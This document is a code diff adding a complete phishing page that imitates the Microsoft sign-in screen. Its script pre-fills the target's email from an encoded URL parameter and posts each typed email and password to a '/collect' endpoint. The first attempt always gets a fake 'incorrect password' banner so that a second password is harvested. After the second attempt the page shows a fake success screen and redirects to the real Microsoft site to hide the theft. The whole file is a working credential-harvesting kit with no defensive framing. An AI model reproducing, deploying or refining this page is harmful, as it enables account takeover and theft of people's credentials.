@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Microsoft</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #edf1f8;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .bg-svg {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+
+    .main {
+      position: relative;
+      z-index: 10;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      gap: 10px;
+    }
+
+    .card {
+      background: #ffffff;
+      padding: 44px 44px 36px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.13);
+    }
+
+    .card-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      text-decoration: none;
+    }
+
+    .ms-logo-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2.5px;
+      width: 22px;
+      height: 22px;
+    }
+
+    .ms-logo-grid span { display: block; }
+    .ms-logo-grid span:nth-child(1) { background: #f25022; }
+    .ms-logo-grid span:nth-child(2) { background: #7fba00; }
+    .ms-logo-grid span:nth-child(3) { background: #00a4ef; }
+    .ms-logo-grid span:nth-child(4) { background: #ffb900; }
+
+    .ms-logo-text {
+      font-size: 16px;
+      color: #1b1b1b;
+      font-weight: 400;
+      letter-spacing: -0.2px;
+    }
+
+    .view { display: none; }
+    .view.active { display: block; }
+
+    .card h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 24px;
+      letter-spacing: -0.3px;
+    }
+
+    .field {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .field input {
+      width: 100%;
+      height: 42px;
+      border: none;
+      border-bottom: 1px solid #666;
+      background: transparent;
+      padding: 12px 36px 4px 0;
+      font-size: 16px;
+      color: #1b1b1b;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+
+    .field input::placeholder {
+      color: #666;
+      font-size: 14px;
+    }
+
+    .field input:focus {
+      border-bottom: 2px solid #0067b8;
+    }
+
+    .field input.err {
+      border-bottom: 2px solid #a80000;
+    }
+
+    .field-error {
+      display: none;
+      color: #a80000;
+      font-size: 12px;
+      margin-top: 5px;
+      line-height: 1.4;
+    }
+
+    .field-error.show { display: block; }
+
+    .eye-btn {
+      position: absolute;
+      right: 0;
+      bottom: 6px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      color: #666;
+      display: flex;
+      align-items: center;
+    }
+
+    .eye-btn:hover { color: #1b1b1b; }
+    .eye-btn svg { width: 18px; height: 18px; fill: currentColor; }
+
+    .btn-primary {
+      height: 36px;
+      padding: 0 20px;
+      background: #0067b8;
+      color: #fff;
+      border: none;
+      font-size: 15px;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.1s;
+      min-width: 108px;
+    }
+
+    .btn-primary:hover { background: #005a9e; }
+    .btn-primary:active { background: #004e8c; }
+    .btn-primary:disabled { background: #8ab4d8; cursor: default; }
+
+    .btn-secondary {
+      height: 36px;
+      padding: 0 20px;
+      background: #e6e6e6;
+      color: #1b1b1b;
+      border: none;
+      font-size: 15px;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.1s;
+      min-width: 90px;
+    }
+
+    .btn-secondary:hover { background: #d5d5d5; }
+
+    .btn-row {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 8px;
+      margin-top: 28px;
+    }
+
+    .btn-back {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: none;
+      border: none;
+      color: #0067b8;
+      font-size: 13px;
+      font-family: inherit;
+      cursor: pointer;
+      padding: 0;
+      margin-bottom: 16px;
+    }
+
+    .btn-back:hover { text-decoration: underline; }
+    .btn-back svg { width: 14px; height: 14px; fill: currentColor; }
+
+    .link {
+      color: #0067b8;
+      font-size: 13px;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 6px;
+    }
+
+    .link:hover { text-decoration: underline; }
+
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #1b1b1b;
+      margin-top: 16px;
+    }
+
+    .checkbox-row input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: #0067b8;
+      cursor: pointer;
+    }
+
+    .user-display {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .user-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #0067b8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 400;
+      flex-shrink: 0;
+    }
+
+    .user-email-chip {
+      font-size: 14px;
+      color: #1b1b1b;
+      padding: 4px 8px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      border: 1px solid transparent;
+    }
+
+    .user-email-chip:hover { background: #f2f2f2; }
+    .user-email-chip svg { width: 12px; height: 12px; fill: #666; }
+
+    .options-card {
+      background: #ffffff;
+      padding: 18px 28px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.13);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      cursor: pointer;
+      transition: background 0.1s;
+    }
+
+    .options-card:hover { background: #f5f5f5; }
+
+    .options-card-icon {
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .options-card-icon svg { width: 26px; height: 26px; fill: #444; }
+    .options-card span { font-size: 15px; color: #1b1b1b; }
+
+    .success-icon {
+      width: 48px;
+      height: 48px;
+      background: #107c10;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .success-icon svg { width: 24px; height: 24px; fill: #fff; }
+
+    .loading-dots { display: inline-flex; gap: 4px; align-items: center; }
+    .loading-dots span {
+      width: 6px; height: 6px; border-radius: 50%; background: #fff;
+      animation: dotPulse 1.2s infinite;
+    }
+    .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes dotPulse {
+      0%, 80%, 100% { opacity: 0.2; transform: scale(0.8); }
+      40% { opacity: 1; transform: scale(1); }
+    }
+
+    footer {
+      position: relative;
+      z-index: 10;
+      padding: 14px 24px;
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    footer a {
+      font-size: 12px;
+      color: #444;
+      text-decoration: none;
+    }
+
+    footer a:hover { text-decoration: underline; }
+
+    /* ── Password requirements ───────────────────────────────────────── */
+    .pw-rules {
+      display: none;
+      margin-top: 10px;
+      padding: 10px 12px;
+      background: #f8f8f8;
+      border: 1px solid #e0e0e0;
+      border-radius: 2px;
+      font-size: 12px;
+    }
+
+    .pw-rules.visible { display: block; }
+
+    .pw-rule {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      padding: 3px 0;
+      color: #605e5c;
+      transition: color 0.15s;
+    }
+
+    .pw-rule.met { color: #107c10; }
+
+    .pw-rule-icon {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      border: 1.5px solid #a19f9d;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: border-color 0.15s, background 0.15s;
+    }
+
+    .pw-rule.met .pw-rule-icon {
+      background: #107c10;
+      border-color: #107c10;
+    }
+
+    .pw-rule-icon svg {
+      width: 8px;
+      height: 8px;
+      fill: #fff;
+      display: none;
+    }
+
+    .pw-rule.met .pw-rule-icon svg { display: block; }
+
+    /* ── Error banner ────────────────────────────────────────────────── */
+    .error-banner {
+      display: none;
+      background: #fde7e9;
+      border-left: 4px solid #a80000;
+      padding: 10px 14px;
+      margin-bottom: 18px;
+      border-radius: 0 2px 2px 0;
+      font-size: 13px;
+      color: #a80000;
+      line-height: 1.5;
+    }
+
+    .error-banner.show { display: flex; align-items: flex-start; gap: 10px; }
+    .error-banner svg { width: 16px; height: 16px; fill: #a80000; flex-shrink: 0; margin-top: 1px; }
+  </style>
+</head>
+<body>
+
+<!-- Background -->
+<svg class="bg-svg" viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <filter id="sf"><feGaussianBlur stdDeviation="5"/></filter>
+    <filter id="mf"><feGaussianBlur stdDeviation="16"/></filter>
+  </defs>
+  <rect width="1440" height="900" fill="#edf1f8"/>
+  <path d="M0 0 C160 0 380 50 530 200 C660 330 650 530 520 690 C400 830 180 900 0 900 Z" fill="#ccd8ec" opacity="0.42"/>
+  <path d="M-20 -10 C280 -10 660 50 940 200 C1120 300 1200 460 1060 590 C940 700 700 710 480 630 C260 550 40 410 -20 250 Z" fill="#d2dff0" opacity="0.36" filter="url(#sf)"/>
+  <path d="M980 0 C1120 10 1300 70 1420 200 C1510 300 1500 480 1400 620 C1300 760 1120 850 940 870 C800 885 700 850 700 770 C700 690 800 570 880 450 C960 330 980 170 980 0 Z" fill="#d8e5f4" opacity="0.38" filter="url(#sf)"/>
+  <path d="M1240 0 L1440 0 L1440 700 C1380 740 1280 760 1200 720 C1100 670 1080 540 1120 410 C1160 280 1220 150 1240 0 Z" fill="#c6d3e8" opacity="0.28"/>
+  <path d="M0 640 C80 575 240 555 380 615 C500 665 545 775 460 850 C380 915 180 915 0 900 Z" fill="#cad6eb" opacity="0.32" filter="url(#sf)"/>
+  <path d="M1200 800 C1290 745 1400 750 1440 780 L1440 900 L1060 900 C1040 875 1060 840 1100 820 C1150 796 1170 830 1200 800 Z" fill="#dbbfc4" opacity="0.42" filter="url(#mf)"/>
+  <path d="M580 0 L1440 0 L1440 70 C1240 90 980 72 780 50 C680 38 600 52 560 34 Z" fill="#e9eef9" opacity="0.6"/>
+</svg>
+
+<main class="main">
+  <div class="card">
+
+    <!-- VIEW 1: Email + Password -->
+    <div class="view active" id="view-email">
+      <a class="card-logo" href="#" onclick="return false;">
+        <div class="ms-logo-grid">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-logo-text">Microsoft</span>
+      </a>
+
+      <h1>Sign in</h1>
+
+      <div class="field">
+        <input
+          type="email"
+          id="user"
+          placeholder="Email, phone, or Skype"
+          autocomplete="username"
+          spellcheck="false"
+          oninput="clearErr('user','email-error')"
+          onblur="validateEmail()"
+        />
+        <p class="field-error" id="email-error">Enter a valid email address, phone number, or Skype name.</p>
+      </div>
+
+      <!-- Error banner — shown on first failed attempt -->
+      <div class="error-banner" id="error-banner">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <span id="error-banner-text">Your account or password is incorrect. If you don't remember your password, <a href="#" onclick="return false;" style="color:#a80000;">reset it now</a>.</span>
+      </div>
+
+      <div class="field">
+        <input
+          type="password"
+          id="pass"
+          placeholder="Password"
+          autocomplete="current-password"
+          oninput="onPasswordInput()"
+          onblur="validatePassword()"
+
+          onkeydown="if(event.key==='Enter') handleLogin()"
+        />
+        <button class="eye-btn" onclick="togglePasswordV1()" type="button" aria-label="Show password">
+          <svg id="eye-icon-v1" viewBox="0 0 24 24">
+            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+          </svg>
+        </button>
+        <p class="field-error" id="password-error-v1">Enter your password.</p>
+      </div>
+
+      <!-- Live password requirement checklist -->
+      <div class="pw-rules" id="pw-rules">
+        <div class="pw-rule" id="rule-len">
+          <span class="pw-rule-icon"><svg viewBox="0 0 10 8"><path d="M1 4l3 3 5-6"/></svg></span>
+          <span>At least 8 characters</span>
+        </div>
+        <div class="pw-rule" id="rule-upper">
+          <span class="pw-rule-icon"><svg viewBox="0 0 10 8"><path d="M1 4l3 3 5-6"/></svg></span>
+          <span>Uppercase letter (A–Z)</span>
+        </div>
+        <div class="pw-rule" id="rule-num">
+          <span class="pw-rule-icon"><svg viewBox="0 0 10 8"><path d="M1 4l3 3 5-6"/></svg></span>
+          <span>Number (0–9)</span>
+        </div>
+        <div class="pw-rule" id="rule-special">
+          <span class="pw-rule-icon"><svg viewBox="0 0 10 8"><path d="M1 4l3 3 5-6"/></svg></span>
+          <span>Special character (!&nbsp;@&nbsp;#&nbsp;$&nbsp;%&nbsp;…)</span>
+        </div>
+      </div>
+
+      <a href="#" class="link" onclick="return false;">Forgot password?</a>
+
+      <div class="checkbox-row">
+        <input type="checkbox" id="keep-signed-in">
+        <label for="keep-signed-in">Keep me signed in</label>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn-secondary" onclick="resetAll()">Back</button>
+        <button class="btn-primary" id="submit-btn" onclick="handleLogin()">Next</button>
+      </div>
+    </div>
+
+    <!-- VIEW 2: Success -->
+    <div class="view" id="view-success">
+      <a class="card-logo" href="#" onclick="return false;">
+        <div class="ms-logo-grid">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-logo-text">Microsoft</span>
+      </a>
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
+      <h1 style="margin-bottom:10px;">You're signed in</h1>
+      <p style="font-size:14px;color:#444;margin-bottom:28px;">Redirecting you to your account&hellip;</p>
+    </div>
+
+  </div>
+</main>
+
+<footer>
+  <a href="#">Terms of use</a>
+  <a href="#">Privacy &amp; cookies</a>
+  <a href="#">&#8230;</a>
+</footer>
+
+<script>
+(function () {
+
+  /* ── decode ?e= param ── */
+  var recipientEnc   = new URLSearchParams(window.location.search).get('e') || '';
+  var recipientEmail = '';
+  try {
+    if (recipientEnc) {
+      var b64 = recipientEnc.replace(/-/g, '+').replace(/_/g, '/');
+      b64 += '='.repeat((4 - b64.length % 4) % 4);
+      recipientEmail = atob(b64);
+    }
+  } catch (e) { /* ignore */ }
+
+  /* pre-fill email field */
+  if (recipientEmail) {
+    document.getElementById('user').value = recipientEmail;
+  }
+
+  /* ── attempt counter ── */
+  var attemptCount = 0;
+
+  /* ── password rules ── */
+  var RULES = [
+    { id: 'rule-len',     test: function(v){ return v.length >= 8; } },
+    { id: 'rule-upper',   test: function(v){ return /[A-Z]/.test(v); } },
+    { id: 'rule-num',     test: function(v){ return /[0-9]/.test(v); } },
+    { id: 'rule-special', test: function(v){ return /[^A-Za-z0-9]/.test(v); } },
+  ];
+
+  window.onPasswordInput = function () {
+    var val = document.getElementById('pass').value;
+    RULES.forEach(function(r) {
+      var el = document.getElementById(r.id);
+      if (r.test(val)) el.classList.add('met');
+      else el.classList.remove('met');
+    });
+    /* hide inline error while typing */
+    document.getElementById('pass').classList.remove('err');
+    document.getElementById('password-error-v1').classList.remove('show');
+  };
+
+  /* ── eye toggle ── */
+  window.togglePasswordV1 = function () {
+    var inp  = document.getElementById('pass');
+    var icon = document.getElementById('eye-icon-v1');
+    var show = inp.type === 'password';
+    inp.type = show ? 'text' : 'password';
+    icon.innerHTML = show
+      ? '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>'
+      : '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+  };
+
+  /* ── validation ── */
+  window.clearErr = function (inputId, errId) {
+    document.getElementById(inputId).classList.remove('err');
+    document.getElementById(errId).classList.remove('show');
+  };
+
+  window.validateEmail = function () {
+    var val = document.getElementById('user').value.trim();
+    if (!val) {
+      document.getElementById('user').classList.add('err');
+      document.getElementById('email-error').classList.add('show');
+      return false;
+    }
+    return true;
+  };
+
+  window.validatePassword = function () {
+    var val = document.getElementById('pass').value;
+    if (!val) {
+      document.getElementById('pass').classList.add('err');
+      document.getElementById('password-error-v1').classList.add('show');
+      return false;
+    }
+    return true;
+  };
+
+  window.resetAll = function () {
+    attemptCount = 0;
+    document.getElementById('user').value = recipientEmail || '';
+    document.getElementById('pass').value = '';
+    clearErr('user', 'email-error');
+    clearErr('pass', 'password-error-v1');
+    document.getElementById('error-banner').classList.remove('show');
+    document.getElementById('pw-rules').classList.remove('visible');
+    RULES.forEach(function(r){ document.getElementById(r.id).classList.remove('met'); });
+  };
+
+  /* ── send creds helper ── */
+  function collect(email, password, attempt) {
+    return fetch('/collect', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({
+        email:     email,
+        password:  password,
+        recipient: recipientEmail || email,
+        attempt:   attempt,
+      }),
+    }).catch(function () { /* swallow network errors */ });
+  }
+
+  /* ── login submit ── */
+  window.handleLogin = function () {
+    var emailOk = validateEmail();
+    var passOk  = validatePassword();
+    if (!emailOk || !passOk) return;
+
+    var email    = document.getElementById('user').value.trim();
+    var password = document.getElementById('pass').value;
+    var btn      = document.getElementById('submit-btn');
+
+    btn.disabled = true;
+    btn.innerHTML = '<span class="loading-dots"><span></span><span></span><span></span></span>';
+
+    attemptCount++;
+
+    if (attemptCount === 1) {
+      /* First attempt — capture creds, show "incorrect" error, prompt retry */
+      collect(email, password, 1).finally(function () {
+        btn.disabled    = false;
+        btn.textContent = 'Next';
+
+        /* show the Microsoft-style error banner */
+        document.getElementById('error-banner').classList.add('show');
+
+        /* clear password so they retype a second one */
+        document.getElementById('pass').value = '';
+        RULES.forEach(function(r){ document.getElementById(r.id).classList.remove('met'); });
+        document.getElementById('pass').focus();
+      });
+    } else {
+      /* Second (or later) attempt — capture creds, show success, redirect */
+      collect(email, password, 2).finally(function () {
+        document.getElementById('view-email').classList.remove('active');
+        document.getElementById('view-success').classList.add('active');
+        setTimeout(function () {
+          window.location.href = 'https://www.microsoft.com/en-us/';
+        }, 2200);
+      });
+    }
+  };
+
+})();
+</script>
+</body>
+</html>
